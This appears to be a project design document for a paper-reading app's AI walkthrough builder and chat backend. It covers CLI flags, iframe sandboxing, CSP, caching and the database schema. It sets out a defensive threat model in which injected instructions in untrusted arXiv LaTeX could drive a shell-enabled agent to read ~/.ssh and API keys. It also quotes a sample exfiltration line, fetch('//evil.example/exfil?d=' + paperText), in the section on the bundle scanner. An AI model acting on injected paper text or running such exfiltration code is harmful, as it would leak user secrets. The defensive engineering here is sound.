**Stage 4 — build (agentic).** `claude -p --model claude-opus-5 --effort high --tools Read,Write,Edit --permission-mode acceptEdits --append-system-prompt <untrusted-input warning> --max-budget-usd <cap> --output-format stream-json --include-partial-messages --verbose --setting-sources "" --no-session-persistence --strict-mcp-config`.

⚠️ **The builder gets no shell and does not bypass permissions, and this is a security boundary rather than a preference.** It reads `paper.tex`, which is **third-party text downloaded from arXiv** — anyone can put words in it, including words shaped like instructions to the agent reading them. The plan originally specified `--tools Read,Write,Edit,Bash --permission-mode bypassPermissions` so the agent could run its own smoke check; that is prompt-injection straight to arbitrary command execution as the user (`~/.ssh`, the stored API key, anything this account can read). Note the bundle's `connect-src 'none'` does **nothing** here: it constrains the *bundle at view time*, not the *builder at build time*. `acceptEdits` auto-approves edits inside the scratch dir and leaves anything outside it to a permission prompt, which under `-p` is a refusal — that is the "writable surface is the scratch dir only" checklist item actually enforced instead of assumed from cwd.

* **cwd is a fresh scratch dir** (`DATA_DIR/walkthroughs/<id>/build-<n>/`), never the repo — Claude Code auto-discovers `CLAUDE.md` by walking up, and Scout measured that mistake at 10,835 vs 602 cached tokens. **Do not "fix" this with `--bare`**: it reads auth strictly from `ANTHROPIC_API_KEY`/`apiKeyHelper` and can never bill the Claude Code plan.
* **`--verbose` is mandatory**, not optional: the CLI refuses `--output-format stream-json` under `-p` without it.
* **`--setting-sources ""`** keeps the run hermetic (no ambient settings, no `SessionStart` hooks) and, verified 2026-08-28, does **not** break plan auth.
* **No `--system-prompt`** — unlike Scout's, this genuinely *is* a coding session, so Claude Code's own agent prompt is what you want. The instructions are `CONTRACT.md` in the scratch dir.
* **The prompt must stay consistent with `--tools`.** `BUILD_PROMPT` is the *last* thing the agent reads, so a stale instruction there outranks `CONTRACT.md`. This drifted once — Bash was removed from `--tools` while step 5 still said "Run `node smoke.mjs`" — and a live build spent 11 minutes heading for an instruction it could never satisfy. `--tools` is now derived from `BUILDER_TOOLS`, and `verify:walkthrough` asserts the prompt names no shell command.
* **The artifact outranks the exit code.** `runCli` no longer fails a build just because the CLI exited non-zero: the exit code describes the *run*, `collectBundle` describes the *artifact*, and we hold an independent authoritative validator (no external origins, valid structure, every script parses). A bundle that passes all of it is usable however the process ended. Measured: a run exited 1 after writing a 79 KB bundle that passed every check, and $2.07 of paid work was discarded unexamined because the exit code was consulted first. A non-zero exit *with* an unusable bundle still fails, and skips the repair round-trip (the run's own error is the better diagnostic).
* **Progress must distinguish slow from stuck.** A refused `Write` and a slow `Write` look identical if only tool *calls* are streamed, so `interpretStreamLine` also forwards tool **results** (`user` messages carrying `tool_result`; `is_error` becomes a visible `✗` line), and each invocation emits a **60-second heartbeat** carrying elapsed minutes, the last tool seen, and whether `bundle.html` exists on disk yet — the ground truth for whether writing works at all.
* **The smoke check runs server-side**, in `collectBundle` + `checkScriptSyntax` — which was the authoritative gate anyway, and now cannot be skipped or faked by the agent. `node --check` only parses, never executes, so running it on generated code is safe. A failure buys **one bounded repair round-trip**, funded from what is *left* of the user's cap rather than a second full cap (a ceiling you can exceed by retrying is not a ceiling). That recovers the self-correction the tool loop was for without handing a shell to text a stranger wrote.
* `--max-budget-usd` is the guardrail that makes an agentic loop safe behind a button (there is no `--max-turns` in CLI 2.1.247). Default $1.50, a setting.

**The contract, helper library and stylesheet are real files in `server/assets/walkthrough/`** — readable, syntax-checkable, diffable — and **their combined sha256 is `CONTRACT_VERSION`, which feeds the cache key.** Editing any of them correctly invalidates every future build instead of silently mixing outputs built to different rules. `wt.js` (scene stepper, sliders, hidpi 2D axes, MathJax wiring, theme variables, WebGL fallback) is **inlined** into each bundle, so a built walkthrough is frozen against later helper changes.

**Stage 5 — serve.** `GET /api/walkthrough/row/:id/bundle`, rendered in `<iframe sandbox="allow-scripts">` with **`allow-same-origin` deliberately absent**, putting generated code in an opaque origin with no access to the app's DOM, storage, cookies or API session. Response CSP: `default-src 'none'; script-src 'self' 'unsafe-inline' <origin>/api/walkthrough/asset/; style-src 'unsafe-inline'; img-src 'self' data: blob: <origin>; connect-src 'none'; frame-ancestors 'self'; base-uri 'none'; form-action 'none'`. **`connect-src 'none'` is the one that matters** — the paper's content cannot be exfiltrated by generated code.

The asset origin is named explicitly as well as by `'self'`, because a sandboxed document's origin is opaque and whether `'self'` resolves there is not worth betting the feature on. It is derived from the `Host` header, which is why **`client/vite.config.ts` sets `changeOrigin: false`** — rewriting Host would emit a CSP for `:3001` while the page loads from `:5173`.

three.js and MathJax are **vendored via npm and served from `/api/walkthrough/asset/`**, never a CDN.

⚠️ **MathJax is pinned to v3 (`es5/tex-svg.js`), and the major version is load-bearing.** MathJax **4** splits its fonts into chunks it fetches from `cdn.jsdelivr.net` *at typeset time*; the bundle's CSP correctly refuses them, whereupon MathJax throws `dynamic file '…' failed to load` and **abandons typesetting entirely**, leaving raw `\(…\)` on screen in every walkthrough. v3 compiles the whole font into the one file, so SVG output genuinely needs no network. `wt.js` additionally sets `loader: { load: [], paths: { mathjax: '/api/walkthrough/asset' } }` so nothing even tries to reach a CDN.

⚠️ **`svg: { fontCache: 'local' }`, never `'global'`.** With `'global'` MathJax keeps every glyph path in a single body-level `<svg id="MJX-SVG-global-cache">` and each equation carries only `<use>` references into it. That element sits *outside* every scroll container the page owns (`.wt-stage`, `.wt-equation`, `mjx-container` all clip; a body-level sibling of `.wt-root` does not), so when it painted, glyphs rendered at raw font coordinates across the whole pane on top of the content. `'local'` inlines each equation's `<defs>` into its own `<svg>` — self-contained, with no shared element to go wrong — at a cost of ~7 KB per equation against a 2 MB MathJax, which is nothing. `wt.css` also hard-hides `#MJX-SVG-global-cache` so its absence is enforced rather than assumed.

⚠️ **Inlining the helpers means every helper fix must be carried to bundles already built.** Freezing a bundle against later `wt.js`/`wt.css` changes is right for *behaviour* and wrong for *bugs*: rebuilding is not an option (a build is minutes and dollars, and the bundle is what the user paid for), so fixes reach stored artifacts through **`npm run migrate:bundles --prefix server`** — named, idempotent migrations, each re-checked with the same `scanForExternalOrigins`/`checkBundleStructure`/`checkScriptSyntax` gate a fresh build passes, refusing to write anything that would fail it, and leaving a `.bak`. It reports by default and writes only with `--apply`. **After changing `wt.js` or `wt.css`, add a migration and run it**, or existing walkthroughs silently keep the bug — that happened three times before the script existed, each fix reaching exactly one of seven bundles.

**Equation tags sit in their own grid track** (`.wt-equation` is `grid-template-columns: minmax(0,1fr) auto`), not absolutely positioned over the maths. They were positioned at the right edge, and since display maths is centred, any equation wide enough to reach that edge rendered underneath its own tag. Wide maths now scrolls inside its own track instead. Clicking a tag to scroll the PDF pane to that equation is investigated but **not built** — the client half is proven (`pdf.getDestinations()` → `equation.N` → page, verified against the printed tag) and the blocker is label→number, which needs a LaTeX counter emulator; see *Click-to-jump from an equation to the PDF* in `walkthrough-mode.md`. `verify:walkthrough` pins the major version and asserts the vendored file contains no lazy font loader — a "vendored" library that phones home is not vendored, and inside the sandbox that failure is silent and total rather than degraded.

⚠️ **The asset route must not send `Cache-Control: immutable`.** `/api/walkthrough/asset/<name>` carries no version, so its *contents* change whenever the pinned dependency does. It was originally `max-age=31536000, immutable`, which meant swapping MathJax 4 for 3 changed nothing for any browser that had already opened a walkthrough — it kept the old bytes for a year and kept rendering raw `\(…\)`, making a correct fix look like no fix at all. `immutable` is only ever safe on a content-addressed URL. The route sends `no-cache` (revalidate, *not* "don't cache"); `sendFile`'s ETag makes each check a 304, so the 2 MB body is not resent.

**The bundle is scanned for external origins before it is written**, belt-and-braces with the CSP. ⚠️ The scanner treats `//` as a line comment **only at the start of a line**: anywhere else it is far more likely to open a protocol-relative URL inside a string — `fetch("//evil.example/exfil?d=" + paperText)` — and honouring it as a comment made the scanner blind to exactly the exfiltration it exists to catch. The asymmetry is deliberate; the contract tells the builder not to write URLs in comments at all.

**Narrow `postMessage` protocol**, validated on both ends. iframe → app: `ready`, `error`, `gotoPage`. app → iframe: `theme`, `setScene`. Nothing else is honored. The frame is in an opaque origin so `event.origin` is `"null"`; identity is established by comparing `event.source` to the frame's `contentWindow`. CSS custom properties do not cross an iframe boundary, so the app **sends** its resolved `--mono-*` palette rather than relying on inheritance, and re-sends it when the theme changes.

**Job model.** A build is minutes and dollars, so it cannot be a blocking request. `POST /api/walkthrough/build/:arxivId` → `202 {jobId}`; `GET /api/walkthrough/job/:jobId/stream` is SSE fed from the CLI's `stream-json` (stages, tool calls, text deltas — thinking deltas are **not** forwarded). In-process registry, **concurrency capped at 1**.

⚠️ **A server restart kills a running build, and this bites in ordinary development**: `tsx watch` restarts the server the moment any server source file is saved. `initializeDatabase()` reaps the orphaned `building` *row* to `failed`, and `runCli` installs a `process.on('exit'|'SIGINT'|'SIGTERM'|'SIGHUP')` reaper that kills the orphaned *subprocess* — without it the child survives its parent and burns the rest of its budget producing a bundle nothing will ever collect. **Do not edit server sources while a build is running.**

**Idempotency, Scout's rule:** identical source + identical outline + identical contract ⇒ the stored bundle, no model call. ⚠️ The row's `cache_key` **must be the outline-derived key**, not a "seed" key computed before the outline existed — otherwise the build pass recomputes a different key, never hits the cache, and every press of Build silently pays for a fresh agentic run. That bug existed and started an unintended build; there is a regression guard for it at both the key and row-store level. "Have I already outlined this source?" is answered by an `arxiv_id` + `source_sha` scan instead.

**Routes are action-first** (`/build/:arxivId`, not `/:arxivId/build`) because arXiv ids contain slashes: `hep-th/9711200` under a greedy wildcard would swallow a trailing segment.

**Rows have no foreign key to `papers`**, deliberately, for the reason `paper_archive` has none: a walkthrough is expensive and must survive the paper being handed to Scribe or deleted. Multiple rows per paper are expected; the newest `ready` row is what the viewer opens, with older ones reachable and individually deletable.

**UI.** `PaperViewer` gets a three-way pane toggle — **PDF only / split / walkthrough only** — not a new top-level `ViewMode`, so the whole sidebar (chat, comments, worldline) stays live beside the walkthrough. Split is the mode that makes a walkthrough genuinely useful: the point of an explainer is checking it against the paper.

⚠️ **Nothing may typeset in a hidden pane.** MathJax sizes its SVG output from measured font metrics — `nodeSize()` reads `offsetWidth`/`offsetHeight` off test nodes — and inside a zero-size subtree those measure 0, the derived `ex` collapses, and every equation is emitted with an enormous `ex` width whose glyphs the viewBox then scales up to sprawl across the page. Because `pdf` is the default mode, mounting the walkthrough pane eagerly meant *every* bundle typeset its first scene while `display: none`. Two independent guards: `WalkthroughPane` is **lazily mounted** (only once its pane has been shown, and stays mounted after), and `wt.js` gates `WT.typeset` behind `whenSized()`, which waits on a `ResizeObserver` for a non-zero `clientWidth` with **no timeout** — if the page is never shown, waiting costs nothing, whereas giving up and typesetting anyway reproduces the bug. The symptom is distinctive: only the *first* scene is affected (later ones typeset while visible), and inline math sprawls furthest because `<p>` has no clipping while `.wt-equation` does.

**Both panes stay mounted in every mode** once shown, hidden with CSS rather than unmounted. Remounting would re-fetch and re-parse the PDF, lose its scroll position, and reload the walkthrough's iframe from scratch (MathJax and all) — precisely the cost you notice when flipping back and forth, which is what the toggle is for. This is safe because `PDFViewer` carries a `ResizeObserver` and its `fitToWidth` already ignores a zero-width container, so hiding and re-showing refits it. Note `.viewer-pdf` sets `flex-direction: column` on the same element, so `.viewer-panes` must state `row` explicitly. Under 900px split stacks vertically — two 300px columns of a paper is worse than either alone.

The toggle is icon-only, and the icons are the layout itself (left-filled / split / right-filled) rather than a document-vs-sparkle pairing, so it reads without labels in an already-crowded header. `currentPage` is shared, so a scene's `gotoPage` drives the real PDF viewer; from walkthrough-only it promotes to split rather than hiding the walkthrough the reader was just in. Uploads (`upload-*`) can never have a walkthrough, so the toggle is hidden and the mode forced to `pdf` — otherwise the reader could be stranded in a pane with no control to leave it. The chosen layout otherwise persists across papers. `Library` shows a `◈` badge; `PaperBrowser` can offer (never trigger) a walkthrough on Scout findings above a score. **There is no bulk build** — a per-paper agentic run is exactly how a cost surprise happens.

**Cost, measured** (not estimated): the outline pass on `1706.03762` cost **$0.319** and 51 s on the `cli` backend — above the plan's $0.15–0.20 guess. Per-run token counts and cost are stored per stage (`outline_cost`, `build_cost`) and shown in the pane header, prefixed `≈` on the CLI backend where the figure is the **list-price equivalent** of plan-billed work, not money charged to an API account. `GET /api/walkthrough/runs` is the spend history.

**Verification:** `npm run verify:walkthrough --prefix server` — 144 checks over an isolated temp data dir, no network, no model: package classification for all three measured shapes, tar path-safety against a hand-built hostile archive, the four main-file tiers, `\input` nesting/cycles/missing targets, comment stripping, macro capture and hoisting, budget truncation order, `normalizeOutline`, cache-key identity (including the seed-key regression), the external-origin scanner, both CLI flag vectors, scratch-dir seeding (including that no API key reaches it), stream-event interpretation, and the builder's capability set (no Bash, no permission bypass, untrusted-input warning present).

### Chat (`claude -p`, TeX source context, Opus 5)

**Reading a paper with a model that has the paper's LaTeX source, resuming one CLI conversation across the whole reading session.** Three changes that only make sense together (full rationale and the live measurements: `chat-overhaul.md`).

**Why TeX and not the PDF.** Same paper (`1706.03762`), same question, both answered correctly: the base64 PDF costs **34,820** prefix tokens, the flattened source **17,291** — half, and the half that survives is the author's macros, `\label`led equations, explicit `\section` structure and theorem environments rather than page images. So chat is the *second* consumer of `texsource.ts` + `texdistill.ts`, and by far the more frequent one; nothing about the pipeline is walkthrough-specific.

What TeX gives up, honestly: **figure images** (the model sees `\caption` text and a filename), and **page numbers** — LaTeX has no pagination, so the prompt tells the model to cite sections and equation labels and never to guess a page. TikZ figures arrive as source, which is usually *more* informative than the rendering. Attaching raster figures alongside is possible (the stream-json input takes `image` blocks the same way it takes `document`) and deliberately not done: an unconditional figure attachment gives back most of the 2x.

**Why the CLI and not the REST API.** Its prompt cache is **1-hour** TTL (`cache_creation.ephemeral_1h_input_tokens`) against the API's 5 minutes — and reading a paper is exactly the pacing that defeats a 5-minute cache: send a message, read for ten minutes, send another. On the API path every such message re-writes the entire paper. And on a Claude Code plan the work is plan-billed rather than charged to metered credits.

⚠️ **The one hazard is prefix identity, and a miss is silent.** Measured on one message: replaying the prompt verbatim cost 152 cache-creation / 43,832 cache-read tokens ($0.0058); omitting `--system-prompt` on the resume — which falls back to Claude Code's default agent prompt — cost 50,347 / 0 ($0.1015). **17x, no error raised.** Everything that shapes the prefix (system prompt, `--model`, `--tools`, `--effort`) is therefore **frozen on the session row at its first message and replayed verbatim**, never rebuilt per request. `system_prompt` is the load-bearing column: the prompt embeds the paper's worldline siblings, so rebuilding it meant adding the paper to a thread mid-conversation silently changed the prefix.

**Flow.**

```
POST /api/chat  { sessionId, message, paperContext }   → SSE
  │
  ├─ session has system_prompt?
  │    no  → resolve context (tex|pdf|abstract), freeze prompt + model + backend
  │          spawn: claude -p --input-format stream-json --session-id <uuid> --system-prompt <frozen> …
  │          stdin: one NDJSON user message = [context block, transcript replay?, user text]
  │    yes → spawn: … --resume <uuid> --system-prompt <frozen, verbatim>
  │          stdin: the user text alone — the paper is not re-sent
  │
  └─ stream text deltas to the client; persist both messages and the usage from the `result` event
```

One process per message: no long-lived subprocess to manage, no restart-recovery problem, and `total_cost_usd` comes back **per invocation** (within one process it accumulates across turns, which would have made per-message accounting wrong).

**Flag vector** (`buildChatArgs()`, exported for the harness exactly as Scout exports `buildCliArgs`):

```
-p --input-format stream-json --output-format stream-json --include-partial-messages --verbose
   --model <chatModel> --effort <chatEffort> --tools ""
   --system-prompt <frozen>  --setting-sources ""  --strict-mcp-config
   (--session-id <uuid> | --resume <uuid>)
```

* `--input-format stream-json` is what lets a `document` block reach the model at all (verified with `--tools ""`, so no Read tool and no 20-page pagination). It requires `--output-format stream-json`, which in turn **requires `--verbose`** — the CLI refuses to start otherwise.
* **No `--no-session-persistence`.** Resume needs the session on disk; that is the entire mechanism.
* `--setting-sources ""` keeps the run hermetic and suppresses the ambient `SessionStart` hooks that otherwise fire on every message. Verified (in the walkthrough builder) not to break plan auth, unlike `--bare` — which must **never** be used here: it reads auth strictly from `ANTHROPIC_API_KEY`/`apiKeyHelper` and can never bill the plan.
* **We cannot send our own `cache_control`.** It passes validation, but the CLI already places four breakpoints and a fifth is a hard `400 A maximum of 4 blocks with cache_control may be provided. Found 5.` The prefix is cached regardless.
* **A stored transcript cannot be replayed as history.** Supplied `assistant` messages in the input stream are not adopted — the CLI answers each streamed `user` message itself. `--resume` is the only cheap path.

⚠️ **The subprocess's cwd must have no `CLAUDE.md` on any ancestor.** Claude Code auto-discovers `CLAUDE.md` by walking *up* from its working directory, and `--system-prompt` does not suppress it; Scout measured that mistake at 10,835 vs 602 cached tokens ($0.11 vs $0.008) for an identical trivial prompt. But the cwd must also be **stable**, because the CLI keys its session store off it (`~/.claude/projects/<slugified cwd>/<uuid>.jsonl`) and `--resume` only finds a session from the directory that created it. `DATA_DIR/chat-sessions/` satisfies stability but not cleanliness: with `SUITE_DATA_ROOT` unset, `DATA_DIR` falls back to `server/data/`, **inside this repo**, three levels under a `CLAUDE.md`. So `chatSessionsCwd()` actually walks the ancestor chain and falls back to a tmpdir when it is polluted, rather than assuming.

**Context modes** — `tex` → `pdf` → `abstract`, resolved once and then frozen, because switching would invalidate the CLI session and its cache. `pdf` covers PDF-only arXiv submissions and **every uploaded paper** (`upload-*` ids have no arXiv source by construction, so uploads skip the TeX attempt entirely). `abstract` is today's silent fallback, now surfaced: the panel shows the mode as a badge, with the degraded one styled to be noticed.

**Re-priming replays the transcript.** A session created before this backend existed (`system_prompt IS NULL`), or one whose CLI session file is gone (`~/.claude` cleaned, machine changed), is primed fresh — and the stored transcript rides into the priming message as a `<conversation-so-far>` block, oldest turns dropped first under a 20k-char cap. The alternative (display-only, never replayed) means the model visibly forgets everything with no explanation the user can see. It costs a few hundred tokens once and rides *after* the paper context block, so the cached paper prefix is unaffected.

⚠️ **Freeze the model you *asked* for, never the one the envelope reports.** The CLI's `result` event carries `modelUsage`, which enumerates every model the session touched — including the small background model Claude Code uses for its own housekeeping — in no meaningful order. Recording `Object.keys(modelUsage)[0]` on the session made turn 2 of a live conversation resume as Haiku: the wrong model answering, *and* a guaranteed cache miss on top, since `--model` is part of the prefix. `interpretChatStreamLine` therefore exposes no model at all, so there is nothing to freeze by mistake.

⚠️ **Client-disconnect detection hangs off the response, not the request.** `req.on('close')` fires when the request *body* stream ends, which on a POST whose body has already been read is immediately — so the abort watch killed every model call the moment it started. It is `res.on('close')` guarded by `!res.writableEnded`, which separates "we finished" from "they left".

**Instrumentation.** A resume that reports `cache_read_input_tokens == 0` has silently paid to re-send the whole paper. It should be impossible — the prompt is replayed verbatim from the row — so when it happens the turn logs a warning server-side and surfaces one in the UI. This is the single most valuable piece of instrumentation in the feature.

**Worldline chat is the same code path**, not a parallel one: same frozen prompt, same `--session-id`/`--resume`, same SSE, with the thread's titles and abstracts in the system prompt and no separate context block (`fixedMode: 'abstract'`). Sharing the path is the point — a prefix-identity bug cannot exist in one and not the other.

**Streaming.** `--include-partial-messages` gives token-by-token deltas, so `/api/chat` is SSE and `ChatPanel` renders progressively; **thinking deltas are deliberately not forwarded** (the user asked about a paper, not to watch the model deliberate). `EventSource` cannot POST, so the client reads the response body directly. Aborting the fetch kills the subprocess server-side, so a closed panel stops paying.

**The client no longer sends the transcript.** `POST /api/chat` takes `{ sessionId, message, paperContext }`; the server owns the conversation and persists both messages as part of the turn, so nothing is uploaded afterwards. Sessions are serialized per id by an in-process lock — two `--resume`s of one uuid at once corrupt it.

**Session reaping.** The CLI writes a transcript per conversation and nothing else prunes them. Deleting a chat session (or all of a paper's) reaps its `<uuid>.jsonl` directly; startup runs an age sweep scoped to the chat cwd's own project slug, over files no live session references. Both only ever unlink a file named exactly by a uuid this server generated, so a wrong slug guess can do no damage.

**Model and cost.** `claude-opus-5` at `--effort medium` (Opus 5 is unusually strong at lower effort, and this is reading comprehension, not proof search). The old `max_tokens: 2048` is gone: on the API path it had to rise to 16000, because adaptive thinking is on by default on Opus 5 and `max_tokens` bounds thinking + output *together*; the CLI has no such flag.

**Measured end-to-end** on `1706.03762` (2026-08-29, CLI backend): the prefix is **21,301 tokens** — the 17,291 of distilled source plus the frozen prompt and the CLI's own preamble, against 34,820 for the base64 PDF. A cold prime costs **$0.236**; a resumed turn reads all 21,301 from cache and writes only **355** new ones, at **$0.018**, in 3.2 s with the first token at 1.9 s. A *fresh session on the same paper* also read the full 21,301 from cache ($0.035), because the 1-hour cache is shared across invocations by prefix — reopening a paper within the hour is nearly free. Estimated ten-message session: **≈ $0.40**, against ≈ $1.40 for the old Sonnet-4 + PDF + 5-minute path at realistic pacing. Fire ten messages inside five minutes and the old path was cheaper; the realistic case is pauses, which is what the 1-hour cache covers. Costs are shown per message, prefixed `≈` on the CLI backend where the figure is the **list-price equivalent** of plan-billed work, not money charged to an API account.

**Settings** (server-side, mirroring `scoutBackend`): `chatBackend` (`cli` default), `chatModel` (`claude-opus-5`), `chatEffort` (`medium`), `chatContextMode` (`tex`). These affect **new sessions only** — an existing session keeps the model, backend and prompt it was created with, or the resume breaks. `GET /api/chat/backend-status` reports whether this machine can answer at all (`claude --version` + `claude auth status`, both local and free); on the `cli` backend the Settings panel and the chat gate check *that* instead of an API key.

**The `api` backend** is the fallback for a headless deploy with no CLI, or when messages should bill to an API account. It has no session store, so it re-sends the paper and the transcript every turn with an ephemeral breakpoint on the system prompt — a 5-minute TTL, which is exactly what the CLI path exists to escape. It streams too, via the Anthropic streaming API.

**Verification:** `npm run verify:chat --prefix server` — 93 checks over an isolated temp data dir, no network, no model. The load-bearing one asserts the prime and resume vectors **differ only in `--session-id` vs `--resume`**, which is the prefix-identity rule mechanized. Also: prompt-freezing determinism and that a worldline change after creation cannot alter the stored prompt, the context fallback chain including `upload-*` forcing `pdf`, NDJSON framing (document block for `pdf`, text for `tex`, **no `cache_control` anywhere**), transcript-replay truncation, result-event parsing (usage, per-invocation cost, `is_error` and non-success subtypes), cost accounting, the CLAUDE.md-ancestor guard on the CLI cwd, the session sweep's keep-list, and migration idempotency.

### Database Schema (`server/data/papers.db`)

SQLite database created at runtime. 15 tables with cascade deletion:

| Table | Key Columns | Constraints |
| --- | --- | --- |
| `papers` | id, arxiv_id, title, summary, authors, published, pdf_path, tier | arxiv_id UNIQUE, tier CHECK (NULL OR 0–4) |
| `comments` | id, paper_id, content, page_number | FK→papers CASCADE |
| `tags` | id, name, color | name UNIQUE, color DEFAULT '#6366f1' |
| `paper_tags` | paper_id, tag_id | Composite PK, both FK CASCADE |
| `favorite_authors` | id, name, added_at | name UNIQUE |
| `worldlines` | id, name, color, created_at | — |
| `worldline_papers` | worldline_id, paper_id, position | Composite PK, both FK CASCADE |
| `chat_sessions` | id, arxiv_id, paper_title, worldline_id, session_type, created_at, updated_at, **cli_session_id, context_mode, system_prompt, backend, model** | session_type CHECK ('paper','worldline'); the last five are frozen at the session's first message (see Chat) |
| `chat_messages` | id, session_id, role, content, token_usage, created_at | FK→chat_sessions CASCADE |
| `settings` | key, value | key PRIMARY KEY (UNIQUE) |
| `paper_embeddings` | arxiv_id, embedding, model_version, created_at | arxiv_id PRIMARY KEY |
| `flag_log` | id, arxiv_id, worldline_id, score, runner_up_score, margin, corroboration_kind, category, flagged_at, accepted, decided_at | UNIQUE(arxiv_id, worldline_id), FK→worldlines CASCADE |
| `scout_runs` | id, cache_key, category, scanned_ids, paper_count, library_fingerprint, model, backend, findings, token counts, estimated_cost, created_at | cache_key UNIQUE (upserted on forced rescan) |
| `paper_archive` | arxiv_id, title, summary, authors, categories, published, tier, tags, worldlines, first_saved_at, removed_at, disposition | arxiv_id PRIMARY KEY, disposition CHECK ('library','scribe','removed'), **no FK — it outlives the paper row** |
| `walkthroughs` | id, arxiv_id, source_version, source_sha, contract_version, cache_key, status, fitness, outline, bundle_path, warnings, model, backend, token counts, outline_cost, build_cost, estimated_cost, error | cache_key UNIQUE, status CHECK ('pending','building','ready','failed','unfit'), **no FK — it outlives the paper row** |

Indices on: `papers.arxiv_id`, `comments.paper_id`, `paper_tags.paper_id`, `paper_tags.tag_id`, `worldline_papers.worldline_id`, `worldline_papers.paper_id`, `chat_sessions.arxiv_id`, `chat_sessions.worldline_id`, `chat_sessions.session_type`, `paper_embeddings.model_version`, `flag_log.worldline_id`, `flag_log.category`, `flag_log.accepted`, `scout_runs.created_at`, `paper_archive.removed_at`, `walkthroughs.arxiv_id`, `walkthroughs.status`.

### Storage Split

**Important:** The project was originally client-side only, storing everything in localStorage. Most data has since been migrated server-side. Do not introduce new localStorage keys for persistent data — use the server-side settings or database instead.

* **Server-side (SQLite)**: Papers, comments, tags, authors, worldlines, chat sessions + messages (plus each session's frozen prompt, model, backend and CLI session id), settings (Claude API key, similarity threshold, Scout backend, chat backend/model/effort/context mode, PDF trim mode, walkthrough backend/budget/effort), paper embeddings, worldline flag log, Scout runs, the ever-saved paper ledger, walkthroughs
* **Client-side (localStorage)**: Only visual preferences that affect rendering before API loads — color scheme and card font size (`paperpile-navigate-visual-prefs`)

## Key Dependencies

**Frontend:** React 18.3, Vite 6, TypeScript 5.7, react-pdf 9.1, react-markdown 10.1, better-react-mathjax 2.4, d3 7.9

**Backend:** Express 4.21, TypeScript 5.7, better-sqlite3 11.7, xml2js 0.6, cors 2.8, @huggingface/transformers (tokenizer + all-MiniLM fallback), onnxruntime-node 1.21 (SPECTER2 ONNX inference), three 0.185 + **mathjax 3.2** (vendored *only* to be served into walkthrough bundles — never imported by the server; mathjax is pinned to v3 because v4 lazy-loads fonts from a CDN, see Walkthrough Mode), tsx 4.19 (dev)

## Conventions

### Code Style

* **TypeScript strict mode** enabled in both client and server tsconfig
* **Naming**: camelCase for variables/functions, PascalCase for components/interfaces/types, snake_case for database columns and table names, UPPER_CASE for constants
* **Imports**: Named imports from libraries, `* as api` / `* as db` for service modules, relative paths for local files
* **No linter or formatter config** — follow existing code style in each file

### API Patterns

* All routes under `/api` prefix, RESTful verbs (GET/POST/PUT/PATCH/DELETE)
* Parameterized SQL queries exclusively — no string interpolation in queries
* HTTP status codes: 201 (created), 400 (bad input), 404 (not found), 409 (conflict/duplicate), 500 (server error)
* Error responses: `{ error: 'descriptive message' }`
* Route-level try-catch wrapping all handlers

### React Patterns

* Functional components with hooks (useState, useEffect, useCallback, useRef)
* Props drilling from App.tsx (no context/store library)
* `showNotification(message)` callback for user-facing errors
* Async operations in useEffect or event handlers with try-catch

### Data Serialization

* `authors` and `categories` fields are JSON strings in the database and `SavedPaper` type
* Parsed to arrays in route handlers when needed
* Always use `JSON.parse()` / `JSON.stringify()` when reading/writing these fields

### Testing

No test framework is currently configured. Validate changes by running `npm run build` (runs `tsc` for both client and server, catching type errors).

Targeted verification harnesses live in `server/scripts/` and run against isolated temp data (`SUITE_DATA_ROOT`), never real data or the Claude API:

```
npm run verify:similarity --prefix server   # similarity-core decision logic + flag log
npm run verify:specter2   --prefix server   # loads the embedding model (the one gate that needs it)
npm run verify:scout      --prefix server   # Scout scan-key identity, fingerprint, ever-saved ledger, run store, output normalization
npm run verify:chat       --prefix server   # chat flag-vector symmetry, frozen prompts, context fallback, NDJSON framing, session reaping
npm run verify:autotrim   --prefix server   # margin detection + document-box aggregation (client code, synthetic pages)
npm run verify:walkthrough --prefix server  # TeX acquisition/distillation, tar path safety, outline + build cache keys, bundle scanner
npm run migrate:bundles   --prefix server   # carry wt.js/wt.css fixes into already-built bundles (report; --apply to write)
```

`verify:autotrim` is the exception to "harnesses live server-side": it exercises `client/src/utils/autoTrim.ts`, which is pure and DOM-free in the parts that matter, and `server/`'s tsconfig only compiles `src/**`, so importing across the boundary from `scripts/` costs the server build nothing.
